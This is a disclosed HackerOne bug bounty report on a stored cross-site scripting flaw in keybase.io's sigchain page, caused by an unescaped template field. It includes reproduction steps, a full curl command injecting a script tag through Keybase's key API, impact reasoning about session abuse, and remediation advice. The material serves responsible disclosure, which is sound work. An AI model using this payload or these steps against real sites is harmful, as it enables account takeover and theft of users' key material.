@@ -1,0 +1,98 @@
+ReportLink:https://hackerone.com/reports/245296
+WeaknessName:Cross-site Scripting (XSS) - Stored
+Reporter:https://hackerone.com/jordanmilne
+ReportedTo:Keybase(keybase)
+BountyAmount:3000.0
+Severity:high
+State:Closed
+DateOfDisclosure:14.03.2019 15:15:33
+
+Summary:
+
+## Issue
+
+Keybase allows you to see other users' sigchains by navigating to <https://keybase.io/<username\>/sigchain>. The "Payload" field containing JSON related to the chainlink on the right side of the page is not correctly escaped during templating, leading to a persistent XSS as users have a high degree of control over the contents of that field.
+
+Specifically, the `/user/sigchain_signature.toffee` template's compiled code contains:
+
+```js
+// ...
+                _to('      <textarea wrap="off" class="form-control fixed full-payload autoselect" rows="20" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" readonly>');
+                _to("" + JSON.stringify(JSON.parse(sig.payload_json), null, 2)); // < `payload_json` is user-controlled and not escaped!
+                _to("</textarea>\n");
+// ...
+```
+
+where normally there would be an `escape()` around the data being interpolated in to prevent special characters being interpreted as HTML.
+
+## Proof-of-Concept
+
+* Create a new account on https://keybase.io or remove all keys / associations from an existing account
+* Generate a GPG keypair locally and upload the public half via https://keybase.io. Make sure you import these into your GPG keychain.
+* When the site asks you to upload the private half, select "maybe another time", then select the option to sign the pubkey with "command line with [bash + GPG + cURL]"
+* keybase.io will spit out a few lines of bash to paste into your terminal, copy this to a text editor.
+* Replace `"tag":"signature"` section of the JSON payload in the cURL command with `"tag":"</textarea><script>alert(1)</script>"`. There's no particular reason we have to inject into the `tag` field, it was just the first field I saw that wasn't validated and was reflected in the "payload" field on the sigchain page.
+
+You should have something like:
+
+```bash
+curl \
+  --data-urlencode sig="`\
+   echo '{"body":{"key":{"eldest_kid":"01015d2654042fe3df8427efd4615406c4a57cbb2bbf3c4b1711f53aace9edf037480a","fingerprint":"b54bac1da5887ffba91411894f6b7c0c98dc7571","full_hash":"3ef468ca735aacdc3beee8f8ac1f88c4441a01a583598871721cd390d74fa465","host":"keybase.io","key_id":"4f6b7c0c98dc7571","kid":"01015d2654042fe3df8427efd4615406c4a57cbb2bbf3c4b1711f53aace9edf037480a","uid":"81d7b93a686f9bc7ff566eeb87bc8719","username":"largenotesting"},"type":"eldest","version":1},"ctime":1498970799,"expire_in":157680000,"prev":"d87dd6918ff960578d29d8c9fd47cfdd8256bc46ed288ff7475522574134a1a0","seqno":19,"tag":"</textarea><script>alert(1)</script>"}' | \
+   gpg -u 'b54bac1da5887ffba91411894f6b7c0c98dc7571' -a --sign`" \
+  --data-urlencode type="eldest" \
+  --data-urlencode session="<SESSION KEY>" \
+  --data-urlencode csrf_token="<CSRF TOKEN>" \
+  --data-urlencode plain_out="1" \
+  --data-urlencode signing_kid="01015d2654042fe3df8427efd4615406c4a57cbb2bbf3c4b1711f53aace9edf037480a" \
+  --data-urlencode public_key="-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: GnuPG v2
+
+mQENBFlYeiwBCADMIXo7d47rJpWwBVqr/obUBb0NpTh7cPnhSeoYPaIRVCPOm6ep
+HVOveqSheiIAJMVu+7sv70t67TTfszCp5lPCpgoGcotb74Eze7aF5DnoBY/kjGUt
+1PwoiMvoTgmoXikWmPd24qb2+2kRRyCSsq93Dd8/Vk1DAcDxzRbvxlLCsFGWfNmr
+RmPYB31U8OuPp7n9+FqEAWXVxFl/5AswpfRhekwG1ujlRzv4Ufpnb1PGVTdhwI0j
+/+Mk+7gK5MqcbGUT/W2O0M01onWN0Xg8pDBliR2D2ePpI08GxV0BnBYhCWgYI683
+RWrgTuSaHNdS3TqwULehYKNSqB3U2OTsdL9ZABEBAAG0KXNvbWV0aGluZyA8YW5v
+dGhlcmtleWJhQHNheW5vdG9saW51eC5jb20+iQE3BBMBCAAhBQJZWHosAhsDBQsJ
+CAcCBhUICQoLAgQWAgMBAh4BAheAAAoJEE9rfAyY3HVxgLcH/RdkDjwgLwmIiOzh
+JY/EzcVApSqMWLEO7JQZCHUgJNq/h7HY6uHd12uEAirP+QRpDIE1h98YSeIxQLAR
+iWrmST/tR9PhmeUN1pYJfuPEW8PLDkefrKde+0XhvWoOzTvQNiYFGlCnP9BIiJky
+GzC0Tb7Dg8iVe032QjYCbqNyQkWmQ9ztM+j+mPHKTfMC1hzU+lOt4nexWlTSf/z6
+4GURt131gIVBuQu7pm61QZP/u+dPdazho1ikmASNHHYkAnJFzMWQ7GDi7Lqns/mB
+W7XFEqbT4dOSeEOVkckiPNDcVFgdhPiDTm4VWzQAsYU/Zr3AhcxuBSQT6l11fvWb
+EmuWeFa5AQ0EWVh6LAEIAMOJF/a1Tz7Nwa5+FhpbBX0svIzpPCfREdDg0kO0cKWU
+81IWZZrDHqmlfxCnqPyB7XfrwFb40gIbBmi6mrZb5COo5pDQ7uE+cWn5cmpVVOqx
+kEjX8jEd0SzO5kBFevlVHlGrcO23tm2FuKZBHf69u2U15ivYijceJFnRCCyW0RFQ
+Cz9Rz9XBkth6x3SswBZQAT2qAaBnVwQv/YzleBH2cCUSxMkjLE8zjkFL8W+zEVGw
+9NyWQHJ/TmaHeAojvRisJ1MyIpRLhFDn8h5PYuvZs8XRK7pen+PznIAtuYYfENCR
+7tPqAp4yFkKhOBy7zQB9PUOoaZWxRwUs4HoDIkNSnWcAEQEAAYkBHwQYAQgACQUC
+WVh6LAIbDAAKCRBPa3wMmNx1ceKnB/905aQn5eJDo7Dva0AjDjYL6+mSf1eeMElF
+UUhqR3/ZVUrla5xX3N1wvnC5YfBAjXY4WpRtDFfNR35EA31kP8biAWs1bgaPybyr
+JZqHD7DQS+tccHKQd/ovNg5qFIh8KKv1pMI66n1GtG4C6btz8cbxhUj1WYfBbxdR
+egSWT5WEP+lm3+iSGg4C/yPOpvqdx7ORCLvje8v9lQ8XMOPwclvYsZKuydi4anT0
+sy7LbithYRusQrkO40qiTgsD6YHGZiN++SscMg04RYgRz/F37hYeWhZqwsnq4mt3
+lzONWNX5pQsSbP0dAiJvh8otImITQFUUnfu5z+jJCXdze9/2FV8z
+=1hmO
+-----END PGP PUBLIC KEY BLOCK-----" \
+  --data-urlencode is_primary="true" \
+  --data-urlencode sig_required="true" \
+  https://keybase.io/_/api/1.0/key/add.json
+```
+* Run the command, then go to <https://keybase.io/<YOUR_USERNAME\>/sigchain>. You should see an `alert()` box pop.
+
+I can also make a profile that repros this issue if you like, I've cleared my profile since verifying this was an issue.
+
+## Impact
+
+It seems like _most_ sensitive functionality on keybase.io is behind a password re-entry wall, so if the victim didn't have a password manager that would autopopulate password fields on https://keybase.io the attacker would have to dump a fake login prompt into the DOM to be able to do anything "interesting". I suppose an attacker would at least be able to pull down the user's TripleSec-encrypted privkey bundles to perform an offline attack without any special user interaction.
+
+However, the frontend JS references some admin-only API endpoints (viewing crashlogs, billing stuff, etc) that don't seem to require password re-auth. An XSS in the context of an admin user's session would probably allow an attacker to abuse those endpoints.
+
+## Remediation
+
+The "payload" JSON should be escaped in the template like anything else in a text node. More generally, more of web frontend code should be switched to modern HTML templating techniques. There's a number of suspect instances of semi-user-controlled data being passed into HTML sinks like `$.html()`, `$.append()`, `$.prepend()`, etc.
+
+The web frontend would also be a good candidate for CSP with nonces, since it doesn't seem to pull in third-party resources other than statics from S3, and that would have mitigated this XSS in most modern browsers.
+
+Just let me know if you need any more details! Also, hi @chromakode!
